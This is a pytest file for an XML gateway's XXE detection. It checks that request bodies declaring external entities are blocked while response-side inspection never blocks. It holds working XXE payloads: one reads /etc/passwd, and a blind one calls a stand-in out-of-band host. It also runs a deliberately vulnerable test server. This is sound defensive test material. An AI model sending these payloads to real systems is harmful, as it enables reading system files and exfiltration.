"""
AEGIS Gateway — XXE: the request-side ATTEMPT BLOCKS; the RESPONSE-side leak-proof never blocks.

Two distinct, complementary layers — do not conflate them:

  * REQUEST side (``inspect_request`` -> ``xxe_attempt``): a request BODY declaring a COMPLETE external
    (SYSTEM/PUBLIC) entity is an UNAMBIGUOUS XXE ATTEMPT — the request-side sibling of
    ``path_traversal_attempt`` — and is now a real inline BLOCK (403 + re-runnable certificate). It proves
    an ATTEMPT (the body declares an external entity), NEVER exploitation / file disclosure. Fired/benign
    corpus + certificate + 403 e2e live in ``test_ssrf_xxe_block.py``; a couple of e2e cases are pinned here
    too. (A general entity-free / internal-entity-only / truncated body does NOT block; a truncated external
    entity stays the LEAD — see ``test_ssrf_xxe_leads.py``.)

  * RESPONSE side (``inspect_response``): the adversarial review proved a single inline exchange cannot
    CAUSALLY prove XXE EXPLOITATION — a `/etc/passwd` root line in the response can be REFLECTED user content
    (a security-KB / paste / code-review / Q&A page that documents an XXE example and echoes a sample root
    line), not a file the app read. So ``inspect_response`` NEVER returns an xxe block, for the real leak or
    for the review FP twin. THIS THESIS IS UNCHANGED by the request-side block (which proves the attempt, not
    the leak) and is still pinned below by the direct ``inspect_response`` unit tests.

These tests pin:
  * an external-entity (file-read or blind) XXE REQUEST is BLOCKED request-side (403 + cert), so the upstream
    leak never happens;
  * an ordinary entity-free XML request is FORWARDED;
  * `inspect_response` never returns an xxe block for ANY input (incl. the exact code-review-comment review FP).
"""

from __future__ import annotations

import http.server
import socketserver
import threading
import urllib.error
import urllib.request
from collections.abc import Iterator

import pytest

from framework.v2.aegis.gateway import serve_gateway
from framework.v2.aegis.inspect import inspect_request, inspect_response
from framework.v2.aegis.models import AegisConfig, Verdict

# A canonical leaked /etc/passwd body (root at uid/gid 0).
_PASSWD = ("root:x:0:0:root:/root:/bin/bash\n"
           "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
           "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n")

_XML = [("Content-Type", "application/xml")]

# An external-entity DTD that reads a local file (the classic in-band XXE payload).
_XXE_FILE = ('<?xml version="1.0"?>'
             '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
             '<foo>&xxe;</foo>')
# An external-entity DTD that points OUT-OF-BAND (blind XXE) — no file content is reflected inline.
_XXE_BLIND = ('<?xml version="1.0"?>'
              '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://collab.example/x.dtd"> ]>'
              '<foo>&xxe;</foo>')
# An ordinary XML API request (no external entity at all).
_XML_ORDINARY = '<note><to>bob</to><help>see the /etc/passwd docs page</help></note>'


class _XxeUpstream(http.server.BaseHTTPRequestHandler):
    """Deliberately vulnerable XML endpoint: a request body declaring an external SYSTEM file entity
    leaks the file content into the response on its own line (in-band XXE); an out-of-band entity is
    fetched with no inline reflection (blind XXE); anything else is a benign ack. AEGIS FORWARDS all
    of these — in-band XXE is a lead, not a block — so the upstream leak is deliberately relayed."""

    def log_message(self, *_a):
        return

    def _read(self) -> str:
        n = int(self.headers.get("Content-Length", "0") or "0")
        return self.rfile.read(n).decode("utf-8", "replace") if n > 0 else ""

    def _send(self, out: bytes) -> None:
        self.send_response(200)
        self.send_header("Content-Type", "application/xml")
        self.send_header("Content-Length", str(len(out)))
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(out)

    def do_POST(self):
        low = self._read().lower()
        declares_ext = "<!entity" in low and "system" in low
        reads_file = declares_ext and "file:" in low
        if reads_file:
            self._send(("<result>\n" + _PASSWD + "</result>").encode())
        elif declares_ext:
            self._send(b"<result>accepted for processing</result>")
        else:
            self._send(b"<result>ok</result>")


@pytest.fixture()
def xxe_upstream() -> Iterator[int]:
    srv = socketserver.TCPServer(("127.0.0.1", 0), _XxeUpstream)
    srv.daemon_threads = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        yield srv.server_address[1]
    finally:
        srv.shutdown()
        srv.server_close()


def _gateway(upstream_port: int, *, mode: str, sink: list | None = None):
    gw = serve_gateway(f"http://127.0.0.1:{upstream_port}",
                       config=AegisConfig(deployment_secret="k", mode=mode),
                       host="127.0.0.1", port=0,
                       on_verdict=(sink.append if sink is not None else None))
    threading.Thread(target=gw.serve_forever, daemon=True).start()
    return gw, gw.server_address[1]


def _post(port: int, body: str):
    req = urllib.request.Request(
        f"http://127.0.0.1:{port}/upload", data=body.encode(),
        headers={"Content-Type": "application/xml"}, method="POST")
    return urllib.request.urlopen(req, timeout=5)


# --------------------------------------------------------------------------- end-to-end (enforce)

def test_inband_xxe_file_disclosure_request_is_blocked_request_side(xxe_upstream):
    """CORE: the external-entity REQUEST is now BLOCKED request-side (403 + re-runnable cert) as an
    unambiguous XXE ATTEMPT — it never reaches the vulnerable upstream, so the file-disclosure leak never
    happens. The block proves the ATTEMPT (the body declares an external entity), NOT the leak (the
    response-side leak-proof — which could FP on reflected content — is deliberately never used to block)."""
    sink: list[Verdict] = []
    gw, port = _gateway(xxe_upstream, mode="enforce", sink=sink)
    try:
        with pytest.raises(urllib.error.HTTPError) as ei:
            _post(port, _XXE_FILE)
        assert ei.value.code == 403 and ei.value.headers.get("X-Aegis-Block") == "xxe_attempt"
        v = next(v for v in sink if v.decision == "confirmed" and v.attack_class == "xxe_attempt")
        assert v.certificate is not None and v.certificate.reverify() is True
    finally:
        gw.shutdown()


def test_xxe_external_entity_request_is_a_block():
    """An external-entity XXE request body is a request-side BLOCK (confirmed, action=block, re-runnable
    certificate) — the UNAMBIGUOUS-construct subset promoted from the old LEAD. It proves an ATTEMPT, not
    exploitation."""
    v = inspect_request("POST", "/upload", _XML, _XXE_FILE, enforce=True)
    assert v is not None and v.decision == "confirmed" and v.attack_class == "xxe_attempt"
    assert v.action == "block" and v.certificate is not None and v.certificate.reverify() is True


def test_blind_xxe_request_is_also_blocked(xxe_upstream):
    """Blind/OOB XXE ALSO declares an external SYSTEM entity, so the request-side block fires on it too — the
    attempt is unambiguous regardless of whether the dereference is in-band or out-of-band."""
    sink: list[Verdict] = []
    gw, port = _gateway(xxe_upstream, mode="enforce", sink=sink)
    try:
        with pytest.raises(urllib.error.HTTPError) as ei:
            _post(port, _XXE_BLIND)
        assert ei.value.code == 403 and ei.value.headers.get("X-Aegis-Block") == "xxe_attempt"
    finally:
        gw.shutdown()


def test_ordinary_xml_request_is_forwarded(xxe_upstream):
    gw, port = _gateway(xxe_upstream, mode="enforce")
    try:
        assert "ok" in _post(port, _XML_ORDINARY).read().decode()
    finally:
        gw.shutdown()


# --------------------------------------------------------------------------- unit: never blocks

def test_inband_xxe_response_side_never_blocks():
    """`inspect_response` must NEVER return an xxe block — for the real leak or any FP twin."""
    cases = [
        # a genuine in-band file disclosure (the app really read the file) — still not blocked inline.
        (_XXE_FILE, "<result>\n" + _PASSWD + "</result>"),
        # THE REVIEW FP: a code-review / paste page that documents an XXE example AND echoes a passwd
        # line, with the DTD HTML-escaped in the response (benign reflected user content).
        (_XXE_FILE, "You submitted:\n&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;]&gt;\n"
                    "This would leak: " + _PASSWD),
        # blind XXE — no file content inline.
        (_XXE_BLIND, "<result>accepted for processing</result>"),
        # ordinary XML that merely mentions the file.
        (_XML_ORDINARY, "dump:\n" + _PASSWD),
        # non-XML body that carries a passwd line in the response (no DTD vector).
        ("q=how+to+read+etc+passwd", "help:\n" + _PASSWD),
        # no request body at all.
        (None, "<result>\n" + _PASSWD + "</result>"),
    ]
    for body, resp in cases:
        assert inspect_response("/upload", _XML, body, resp, enforce=True) is None, (body, resp)


def test_review_fp_code_review_comment_forwards():
    """The exact review false positive, isolated: a plain-text code-review comment quoting the XXE
    payload plus its sample output, HTML-escaped by the server but echoing the plaintext passwd line,
    is FORWARDED (no block, no overclaiming certificate)."""
    comment = ("<comment>\n"
               "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n"
               "This DTD would leak: root:x:0:0:root:/root:/bin/bash\n"
               "</comment>")
    escaped_echo = ("Comment posted. Preview:\n"
                    "&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;\n"
                    "This DTD would leak: root:x:0:0:root:/root:/bin/bash\n")
    assert inspect_response("/comments", _XML, comment, escaped_echo, enforce=True) is None
